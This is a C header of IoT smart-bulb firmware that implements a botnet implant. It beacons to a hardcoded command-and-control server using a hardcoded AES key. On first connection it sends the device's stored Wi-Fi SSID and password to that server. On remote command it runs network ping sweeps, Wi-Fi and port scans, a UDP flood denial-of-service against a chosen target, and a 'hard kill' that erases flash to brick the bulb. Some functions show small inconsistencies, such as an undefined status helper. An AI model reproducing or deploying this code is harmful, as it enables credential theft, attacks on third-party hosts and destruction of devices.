#ifndef C2_BULB_H
#define C2_BULB_H
#include <string.h>
#include "lwip/sockets.h"
#include "lwip/netif.h"
#include "lwip/icmp.h"
#include "mbedtls/aes.h" 
#include "hal/hal_wifi.h"
#include "hal/hal_ota.h"
#include "logging/logging.h"
#include "rtos_pub.h"
#include "BkDriverFlash.h"
#include "wlan_ui_pub.h"
#include "new_cfg.h"


#define LOG_FEATURE LOG_FEATURE_MAIN

// --- CONFIGURATION ---
#define C2_HEARTBEAT_DELAY 5000
#define BULB_ID "002"
#define C2_SERVER_IP "172.222.1.2"//"172.222.1.2" 
#define C2_SERVER_PORT 8080
#define C2_PACKET_SIZE 256
const unsigned char AES_KEY[] = "1234567890123456"; 

// --- PROTOCOL ---
#define C2_TYPE_HEARTBEAT "hb"
#define C2_TYPE_IP_PART   "ipp"
#define C2_TYPE_IP_FIN    "ipf"
#define C2_TYPE_WIFI_PART "wifip"
#define C2_TYPE_WIFI_FIN  "wifif"
#define C2_TYPE_PORT_PART "portp"
#define C2_TYPE_PORT_FIN  "portf"
#define C2_TYPE_CREDS     "creds"
#define C2_TYPE_DOS	  	  "dos"

// --- GLOBAL STATE ---
volatile int g_stop_scan = 0;
char g_scan_buffer[2048]; 
int g_active_type = 0;   
int g_scan_ready = 0;    
int g_scan_index = 0;
int g_creds_sent = 0;

// Ports relevant to IoT and Servers
const uint16_t target_ports[] = {20, 21, 22, 23, 53, 80, 115, 443};
#define PORT_COUNT (sizeof(target_ports) / sizeof(target_ports[0]))

/**
 * AES-128-ECB Encryption
 * Server uses ECB, so we encrypt block-by-block.
 */
void encrypt_packet(unsigned char *data) {
    mbedtls_aes_context aes;
    mbedtls_aes_init(&aes);
    mbedtls_aes_setkey_enc(&aes, AES_KEY, 128);

    for (int i = 0; i < C2_PACKET_SIZE; i += 16) {
        mbedtls_aes_crypt_ecb(&aes, MBEDTLS_AES_ENCRYPT, data + i, data + i);
    }
    mbedtls_aes_free(&aes);
}

/**
 * AES-128-ECB Decryption
 */
void decrypt_packet(unsigned char *data) {
    mbedtls_aes_context aes;
    mbedtls_aes_init(&aes);
    mbedtls_aes_setkey_dec(&aes, AES_KEY, 128);

    for (int i = 0; i < C2_PACKET_SIZE; i += 16) {
        mbedtls_aes_crypt_ecb(&aes, MBEDTLS_AES_DECRYPT, data + i, data + i);
    }
    mbedtls_aes_free(&aes);
}

void run_port_scan(void *arg) {
    char *target_ip = (char *)arg;
    
    // 1. Initialize Buffer with Target Header
    g_scan_ready = 1; 
    g_active_type = 3; // PORT_SCAN
    g_scan_index = 0;
    memset(g_scan_buffer, 0, sizeof(g_scan_buffer));
    
    // Format: TARGET:10.2.1.15|
    snprintf(g_scan_buffer, 64, "TARGET:%s|", target_ip);

    // 2. Scan the defined port list
    for (int i = 0; i < PORT_COUNT; i++) {
        if (g_stop_scan) break;

        int sock = socket(AF_INET, SOCK_STREAM, 0);

        // 1. Set to Non-Blocking
        int flags = fcntl(sock, F_GETFL, 0);
        fcntl(sock, F_SETFL, flags | O_NONBLOCK);

        struct sockaddr_in addr = {0};
        addr.sin_family = AF_INET;
        addr.sin_port = htons(target_ports[i]);
        addr.sin_addr.s_addr = inet_addr(target_ip);

        // 2. This returns immediately now
        int res = connect(sock, (struct sockaddr *)&addr, sizeof(addr));
        bool is_open = false;
        if (res < 0 && errno == EINPROGRESS) {
            fd_set fdset;
            FD_ZERO(&fdset);
            FD_SET(sock, &fdset);
            
            struct timeval tv = {0, 45000}; // 45ms "Patience"
            
            // 3. Wait for the result
            res = select(sock + 1, NULL, &fdset, NULL, &tv);
            
            if (res > 0) {
                // Port is open!
                is_open = true;
            }
        }
        else{
            is_open = true; // Immediate success, likely open
        }
        if (is_open) {
            char port_str[10];
            snprintf(port_str, sizeof(port_str), "%d;", target_ports[i]);
            strcat(g_scan_buffer, port_str);
        }

        // 4. Always close to prevent the socket leak
        close(sock); 
        rtos_delay_milliseconds(10);
    }

    g_scan_ready = 2; // Signal C2 thread to send the 'portf' (Final) chunk
    rtos_delete_thread(NULL);
}

void run_wifi_ap_scan() {
    g_scan_ready = 1;
    g_active_type = 2; // WIFI
    memset(g_scan_buffer, 0, sizeof(g_scan_buffer));
    
    ScanResult_adv ap_list;
    // Trigger the SDK scan
    if (wlan_sta_scan_once() == 0) {
		if (g_stop_scan) return;
        rtos_delay_milliseconds(2000); // Give the radio time to listen
        wlan_sta_scan_result(&ap_list);

        for (int i = 0; i < ap_list.ApNum; i++) {
            char entry[128]; // Increased size for extra data
            
            // Format: SSID|BSSID|CHAN|RSSI;
            // Example: Stout-Guest|00:11:22:33:44:55|6|-65;
            snprintf(entry, sizeof(entry), "%s|%02x:%02x:%02x:%02x:%02x:%02x|%d|%d;", 
                     ap_list.ApList[i].ssid,
                     ap_list.ApList[i].bssid[0], ap_list.ApList[i].bssid[1], 
                     ap_list.ApList[i].bssid[2], ap_list.ApList[i].bssid[3], 
                     ap_list.ApList[i].bssid[4], ap_list.ApList[i].bssid[5],
                     ap_list.ApList[i].channel,
                     ap_list.ApList[i].ApPower);
            
            // Append to the global drip buffer if there's space
            if (strlen(g_scan_buffer) + strlen(entry) < sizeof(g_scan_buffer)) {
                strcat(g_scan_buffer, entry);
            }
        }
    }
    g_scan_ready = 2; // Mark as complete for the C2 drip thread
}

// Helper to calculate ICMP checksum
uint16_t icmp_chksum(void *data, int len) {
    uint32_t sum = 0;
    uint16_t *ptr = (uint16_t *)data;

    while (len > 1) {
        sum += *ptr++;
        len -= 2;
    }
    if (len == 1) {
        sum += *(uint8_t *)ptr;
    }

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (uint16_t)(~sum);
}

bool ping_target(uint32_t target_ip) {
    target_ip = htonl(target_ip); // Ensure target IP is in network byte order
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0) return false;

    // Set a very short timeout for the demo
    struct timeval tv = {0, 200000}; // 200ms
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    ADDLOGF_WARN("Scanning IP: %s", inet_ntoa(*(struct in_addr *)&target_ip));
    struct icmp_echo_hdr echo_req;
    echo_req.type = ICMP_ECHO;
    echo_req.code = 0;
    echo_req.chksum = 0;
    echo_req.id = 0x1234;
    echo_req.seqno = 0;
    echo_req.chksum = icmp_chksum(&echo_req, sizeof(echo_req));

    struct sockaddr_in servaddr;
    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = target_ip;

    sendto(sock, &echo_req, sizeof(echo_req), 0, (struct sockaddr *)&servaddr, sizeof(servaddr));

    char recv_buf[64];
    struct sockaddr_in from;
    socklen_t fromlen = sizeof(from);
    
    // If we receive any response, the host is "Up"
    int ret = recvfrom(sock, recv_buf, sizeof(recv_buf), 0, (struct sockaddr *)&from, &fromlen);
    close(sock);
    
    return (ret > 0);
}

uint32_t getIPAddr(){
    return 0xC0A80100;
    IPStatusTypedef ipStatus;
    bk_wlan_get_ip_status(&ipStatus, BK_STATION);
    ip4_addr_t ip;
    ip4addr_aton(ipStatus.ip, &ip);
    return ip.addr;
}

uint32_t getIPMask(){
    return 0xFFFFFF00;
    IPStatusTypedef ipStatus;
    bk_wlan_get_ip_status(&ipStatus, BK_STATION);
    ip4_addr_t mask;
    ip4addr_aton(ipStatus.mask, &mask);
    return mask.addr;
}

/**
 * IP SCAN: Dynamic Ping Sweep based on local subnet
 */
void run_ip_ping_sweep() {
    struct netif *net = netif_list;
    if (!net) return;
    uint32_t b_ip = getIPAddr();
    uint32_t b_mask = getIPMask();
    uint32_t base = b_ip & b_mask;
    uint32_t brdcst = base | (~b_mask);

    g_active_type = 1; // IP
    g_scan_ready = 1;
    memset(g_scan_buffer, 0, sizeof(g_scan_buffer));

    for (uint32_t target = base + 1; target < brdcst; target++) {
        if (g_stop_scan) break;

        // Convert target to network byte order for the ping function
        // Use htonl if your loop is incrementing in host byte order
        if (ping_target(target)) {
            struct in_addr addr;
            addr.s_addr = target;
            strcat(g_scan_buffer, inet_ntoa(addr));
            strcat(g_scan_buffer, ";");
        }
        
        // Important: Feed the watchdog or yield to the OS
        rtos_delay_milliseconds(5); 
    }
    g_scan_ready = 2;
}

/**
 * Background Scanner Thread
 * This runs independently of the Heartbeat loop.
 */
void background_scanner_task(void *arg) {
    int type = (int)arg; // Pass 1 for IP, 2 for WIFI
    
    if (type == 1) {
        run_ip_ping_sweep(); // This function now writes to g_scan_buffer
    } else {
        run_wifi_ap_scan();
    }
    g_stop_scan = 0; // Reset stop flag for next scan
    rtos_delete_thread(NULL); // Terminate when done
}

/**
 * Helper to trigger the scan without blocking C2
 */
void trigger_background_scan(int type) {
    if (g_scan_ready == 1) return; // Already scanning
    
    g_scan_ready = 1;
    g_scan_index = 0;
    
    rtos_create_thread(NULL, 4, "scan_task", (void (*)(void*))background_scanner_task, 2048, (void*)type);
}

/**
 * A "Hard Kill" that overwrites the beginning of the application partition with 0xFF
 * This causes an infinite boot loop, requires physical access and flash tools to recover
 */
void execute_hard_kill() {
    bk_printf("[CRITICAL] Erasing first 4KB of app flash...\r\n");
    
    bk_flash_erase(BK_PARTITION_APPLICATION, 0, 0x1000);
    
    bk_printf("[C2] Hardware locked. Goodbye.\r\n");
    bk_reboot();
}

/**
 * Helper to determine current bulb activity
 */
const char* get_current_status() {
    if (g_stop_scan) return "STOPPING";
    
    if (g_scan_ready == 1) {
        if (g_active_type == 1) return "SCANNING_IP";
        if (g_active_type == 2) return "SCANNING_WIFI";
        if (g_active_type == 3) return "SCANNING_PORTS";
    } 
    
    if (g_scan_ready == 2 || (g_scan_ready == 1 && g_scan_index > 0)) {
        return "DRIPPING_DATA";
    }

	if (g_active_type == 9) return "DOS_ATTACK";
    
    return "IDLE";
}

void send_heartbeat(int socket) {
    char pkt[C2_PACKET_SIZE];
    const char* status = get_current_status_string(); // e.g., "IDLE"
    
    if (g_creds_sent == 0) {
        // FIRST CONNECTION: Attach credentials
        snprintf(pkt, sizeof(pkt), "ID:%s|TYPE:creds|DATA:SSID:%s;PASS:%s;STATUS:%s", 
                 BULB_ID, CFG_GetWiFiSSID(), CFG_GetWiFiPass(), status);
        g_creds_sent = 1; 
    } else {
        // STANDARD HEARTBEAT: Just status
        snprintf(pkt, sizeof(pkt), "ID:%s|TYPE:hb|DATA:%s", BULB_ID, status);
    }

    encrypt_packet(pkt);
    send(socket, pkt, strlen(pkt), 0);
}

typedef struct {
    char target_ip[16];
    int port;
    int duration_sec;
} dos_params_t;

void udp_flood_thread(void *arg) {
    dos_params_t *params = (dos_params_t *)arg;
    
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(params->port);
    dest_addr.sin_addr.s_addr = inet_addr(params->target_ip);

    // High-speed junk data
    char *junk = "DATA_EXHAUSTION_PULSE_DATA_EXHAUSTION_PULSE";
    uint32_t start_time = rtos_get_time(); // Get ticks/ms
    
    g_active_type = 9; // Custom status for "DOS_ATTACK"
    
    while ((rtos_get_time() - start_time) < (params->duration_sec * 1000)) {
        if (g_stop_scan) break; // Use your existing STOP logic

        sendto(sock, junk, strlen(junk), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
        
        // No delay = Maximum throughput
        // If the bulb crashes, add rtos_delay_milliseconds(1);
    }
	g_stop_scan = 0; // Reset stop flag
	g_active_type = 0; // Reset status
    close(sock);
    free(params);
    bk_printf("[C2] DoS Attack Finished.\r\n");
    rtos_delete_thread(NULL);
}

void bulb_c2_main(void *arg) {
    while (1) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        struct sockaddr_in srv = {0};
        srv.sin_family = AF_INET;
        srv.sin_port = htons(C2_SERVER_PORT);
        srv.sin_addr.s_addr = inet_addr(C2_SERVER_IP);

        if (connect(sock, (struct sockaddr *)&srv, sizeof(srv)) == 0) {
            unsigned char pkt[C2_PACKET_SIZE] = {0};

            // 1. Check if we have partial data ready to "drip"
            if (g_scan_ready == 2 || (g_scan_ready == 1 && strlen(g_scan_buffer) > g_scan_index + 40)) {
				char *t_part, *t_fin;
				
				// Select tags based on the active scan
				if (g_active_type == 3) {
					t_part = C2_TYPE_PORT_PART;
					t_fin  = C2_TYPE_PORT_FIN;
				} else if (g_active_type == 1) {
					t_part = C2_TYPE_IP_PART;
					t_fin  = C2_TYPE_IP_FIN;
				} else {
					t_part = C2_TYPE_WIFI_PART;
					t_fin  = C2_TYPE_WIFI_FIN;
				}

				int rem = strlen(g_scan_buffer) - g_scan_index;
				int len = (rem > 200) ? 200 : rem;

				if (g_scan_ready == 2 && g_scan_index + len >= strlen(g_scan_buffer)) {
					// Send FINAL chunk
					snprintf((char*)pkt, C2_PACKET_SIZE, "ID:%s|TYPE:%s|DATA:%.*s", 
							BULB_ID, t_fin, len, g_scan_buffer + g_scan_index);
					g_scan_ready = 0; 
					g_scan_index = 0;
				} else {
					// Send PARTIAL chunk (The Drip)
					snprintf((char*)pkt, C2_PACKET_SIZE, "ID:%s|TYPE:%s|DATA:%.*s", 
							BULB_ID, t_part, len, g_scan_buffer + g_scan_index);
					g_scan_index += len;
				}
			}
			else if (g_creds_sent == 0) {
				//Attach credentials
				snprintf((char*)pkt, sizeof(pkt), "ID:%s|TYPE:%s|DATA:SSID:%s;PASS:%s", 
						BULB_ID, C2_TYPE_CREDS, CFG_GetWiFiSSID(), CFG_GetWiFiPass());
				g_creds_sent = 1; 
			}
			else {
                // No data to drip? Send a standard heartbeat
				snprintf((char*)pkt, C2_PACKET_SIZE, "ID:%s|TYPE:%s|DATA:%s", 
								BULB_ID, C2_TYPE_HEARTBEAT, get_current_status());
                
            }

            encrypt_packet(pkt);
            send(sock, pkt, C2_PACKET_SIZE, 0);

            // 2. Listen for Tasking
            unsigned char cmd_pkt[C2_PACKET_SIZE] = {0};
            if (recv(sock, cmd_pkt, C2_PACKET_SIZE, 0) > 0) {
                decrypt_packet(cmd_pkt);
				char *cmd = (char*)cmd_pkt;
				
				if (strstr(cmd, "IP_SCAN")) {
					g_stop_scan = 0; // Reset flag before starting
					trigger_background_scan(1);
				} 
				else if (strstr(cmd, "WIFI_SCAN")) {
					g_stop_scan = 0;
					trigger_background_scan(2);
				}
				else if (strncmp(cmd, "PORT_SCAN", 9) == 0) {
					char *ip_start = strchr(cmd, '|');
					if (ip_start != NULL) {
						ip_start++; // Move past the '|' character
						
						// Safety: Reset state and launch the thread
						g_stop_scan = 0;
						g_scan_ready = 1;
						g_scan_index = 0;
						g_active_type = 3; // PORT_SCAN
						
						// Launch the background task, passing the IP string
						// We use a static buffer or copy the string to ensure it survives
						static char target_ip_persistent[16];
						strncpy(target_ip_persistent, ip_start, 15);
						target_ip_persistent[15] = '\0';

						rtos_create_thread(NULL, 4, "port_task", (void (*)(void*))run_port_scan, 2048, (void*)target_ip_persistent);
						
						bk_printf("[C2] Starting Port Scan on: %s\n", target_ip_persistent);
					}
				}
				else if (strstr(cmd, "STOP_SCAN")) {
					g_stop_scan = 1; // Signal the background thread to kill the loop
					g_scan_ready = 0; // Reset drip state
					g_scan_index = 0;
					memset(g_scan_buffer, 0, sizeof(g_scan_buffer));
					bk_printf("[C2] Kill command received.\n");
				}
				else if (strstr(cmd, "RESTART")) {
					bk_reboot();
				}
				else if (strstr(cmd, "HARD_KILL")) {
					execute_hard_kill();
				}
				else if (strstr(cmd, "GET_CREDS")) {
					// Force resend credentials on next heartbeat
					g_creds_sent = 0;
				}
				else if (strncmp(cmd, "DOS_ATTACK", 10) == 0) {
					// Expected format: DOS|<IP_ADDRESS>|<PORT>|<DURATION>
					dos_params_t *params = malloc(sizeof(dos_params_t));
					if (params == NULL) {
						bk_printf("[!] Memory allocation failed for DoS\r\n");
					} else {
						// Expected format: DOS:192.168.1.50|80|60
						char *data_ptr = cmd + 4;
						char *ip_str = strtok(data_ptr, "|");
						char *port_str = strtok(NULL, "|");
						char *dur_str = strtok(NULL, "|");

						if (ip_str && port_str && dur_str) {
							strncpy(params->target_ip, ip_str, 15);
							params->target_ip[15] = '\0';
							params->port = atoi(port_str);
							params->duration_sec = atoi(dur_str);

							bk_printf("[C2] Starting DoS: %s:%d for %ds\r\n", 
									params->target_ip, params->port, params->duration_sec);

							// Create the background thread
							// rtos_create_thread(Handle, Priority, Name, Func, StackSize, Arg)
							rtos_create_thread(NULL, 
											5, 
											"dos_flood", 
											(void (*)(void*))udp_flood_thread, 
											2048, 
											(void*)params);
						} else {
							free(params);
							bk_printf("[!] Invalid DoS command format\r\n");
						}
					}
				}
            }
        }
        close(sock);
        rtos_delay_milliseconds(C2_HEARTBEAT_DELAY); // Check-in every 3 seconds
    }
}

void bulb_c2_init(){
	rtos_create_thread(NULL, 4, "bulb_c2", (void (*)(void*))bulb_c2_main, 4096, NULL);
}

#endif // C2_BULB_H